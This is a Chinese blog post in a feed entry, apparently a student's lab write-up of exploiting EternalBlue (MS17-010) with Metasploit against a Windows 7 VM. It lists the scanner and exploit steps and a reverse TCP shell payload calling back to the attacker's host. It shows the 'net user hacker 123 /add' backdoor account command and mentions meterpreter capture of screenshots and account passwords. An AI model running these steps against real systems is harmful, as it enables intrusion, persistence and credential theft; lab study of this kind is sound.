    <link href="http://example.com/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2020-11-15T13:41:10.000Z</published>
    <updated>2020-12-10T14:35:13.623Z</updated>
    
    <content type="html"><![CDATA[<h3 id="记第一次网安实验——MSF永恒之蓝（Eternalblue-漏洞利用"><a href="#记第一次网安实验——MSF永恒之蓝（Eternalblue-漏洞利用" class="headerlink" title="记第一次网安实验——MSF永恒之蓝（Eternalblue)漏洞利用"></a>记第一次网安实验——MSF永恒之蓝（Eternalblue)漏洞利用</h3><h3 id="测试工具："><a href="#测试工具：" class="headerlink" title="测试工具："></a>测试工具：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>vmware station15</span><br><span class="line"><span class="number">2.</span>kali linux <span class="number">2020</span></span><br><span class="line"><span class="number">3.</span>靶机windows7</span><br></pre></td></tr></table></figure><h4 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h4><h5 id="1-确定靶机IP，及本机IP地址"><a href="#1-确定靶机IP，及本机IP地址" class="headerlink" title="1.确定靶机IP，及本机IP地址"></a>1.确定靶机IP，及本机IP地址</h5><p>lhost：192.168.11.144</p><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ipadd.png" alt="ipadd"></p><p>rhosts:192.168.11.146</p><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ipconfig.png" alt="ipconfig"></p><h5 id="2-启动MSF-msfconsole-并查找永恒之蓝的exp等相关信息-search-ms17-010"><a href="#2-启动MSF-msfconsole-并查找永恒之蓝的exp等相关信息-search-ms17-010" class="headerlink" title="2.启动MSF(msfconsole),并查找永恒之蓝的exp等相关信息: search ms17-010"></a>2.启动MSF(msfconsole),并查找永恒之蓝的exp等相关信息: search ms17-010</h5><p>![search ms17-010](search ms17-010.png)</p><h5 id="3-测试目标主机是否存在该漏洞-use-auxiliary-scanner-smb-smb-ms17-010-or-use-1-检测程序，设置靶机IP，自动检测是否其存在永恒之蓝漏洞"><a href="#3-测试目标主机是否存在该漏洞-use-auxiliary-scanner-smb-smb-ms17-010-or-use-1-检测程序，设置靶机IP，自动检测是否其存在永恒之蓝漏洞" class="headerlink" title="3.测试目标主机是否存在该漏洞(use auxiliary/scanner/smb/smb_ms17_010 or use 1),检测程序，设置靶机IP，自动检测是否其存在永恒之蓝漏洞"></a>3.测试目标主机是否存在该漏洞(use auxiliary/scanner/smb/smb_ms17_010 or use 1),检测程序，设置靶机IP，自动检测是否其存在永恒之蓝漏洞</h5><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%B5%8B%E8%AF%95.png" alt="测试"><br>可以看出，靶机似乎存在永恒之蓝漏洞<br>(- Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit))</p><h5 id="4-正式攻击，配置exp，设置参数（靶机IP，本机IP，侦听端口等），设置payload-多种选择，看需求吧"><a href="#4-正式攻击，配置exp，设置参数（靶机IP，本机IP，侦听端口等），设置payload-多种选择，看需求吧" class="headerlink" title="4.正式攻击，配置exp，设置参数（靶机IP，本机IP，侦听端口等），设置payload(多种选择，看需求吧)"></a>4.正式攻击，配置exp，设置参数（靶机IP，本机IP，侦听端口等），设置payload(多种选择，看需求吧)</h5><p>这里用的payload: set payload windows/x64/shell_reverse_tcp<br><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/setlhost.png" alt="setlhost"></p><pre><code>  1. set rhosts 192.168.11.146(靶机IP)  2. set lhost 192.168.11.144(本机IP),靶机反向连接本机时需要用到。  3. set payload windows/x64/shell_reverse_tcp   4. exploit || run</code></pre><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" alt="漏洞利用"></p><h5 id="5-拿到shell-试着添加用户组：net-user-hacker-123-add"><a href="#5-拿到shell-试着添加用户组：net-user-hacker-123-add" class="headerlink" title="5.拿到shell,试着添加用户组：net user hacker 123 /add"></a>5.拿到shell,试着添加用户组：net user hacker 123 /add</h5><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/shell%E6%9D%83%E9%99%90.png" alt="shell权限"><br>在cmd进行其他操作……</p><hr><h4 id="另一个payload（set-payload-windows-x64-meterpreter-reverse-tcp）的结果："><a href="#另一个payload（set-payload-windows-x64-meterpreter-reverse-tcp）的结果：" class="headerlink" title="另一个payload（set payload windows/x64/meterpreter/reverse_tcp）的结果："></a>另一个payload（set payload windows/x64/meterpreter/reverse_tcp）的结果：</h4><p>可以获取靶机的screenshot及用户组账户，密码:</p><p><img src="/2020/11/15/MSF-Eternalblue%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E9%9D%B6%E6%9C%BA%E7%94%A8%E6%88%B7.png" alt="靶机用户"></p><p>此图非彼图，这是攻击机漏洞利用后远程使用screenshot命令截的图。</p><p>还得学一下meterpreter这个模块的用法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;记第一次网安实验——MSF永恒之蓝（Eternalblue-漏洞利用&quot;&gt;&lt;a href=&quot;#记第一次网安实验——MSF永恒之蓝（Eternalblue-漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;记第一次网安实验——MSF永恒之蓝（Eterna</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="漏洞利用" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="msf" scheme="http://example.com/tags/msf/"/>
    
  </entry>
  
</feed>
